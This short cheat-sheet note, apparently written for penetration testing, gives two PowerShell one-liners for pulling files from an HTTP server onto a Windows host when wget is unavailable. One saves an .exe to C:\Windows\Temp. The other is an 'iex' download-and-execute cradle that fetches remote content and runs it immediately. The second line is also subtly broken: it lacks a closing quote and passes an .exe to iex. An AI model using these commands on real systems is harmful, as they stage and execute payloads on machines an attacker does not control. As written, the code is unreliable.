When wget is not available/usable on a Windows machine use this command to pull files from an http server:

powershell -c "Invoke-WebRequest -Uri '[HTTP-SERVER]/[FILE.exe]' -OutFile '[C:\Windows\Temp\FILE.exe]'"


Another useful command to achieve succesful http file transfer via powershell:

powershell iex (New-Object Net.WebClient).DownloadString('http://[HTTP-SERVER-IP]:[PORT]/[FILE.exe])



[Square Brackets] indicate changeable fields, tailor them to your use case.
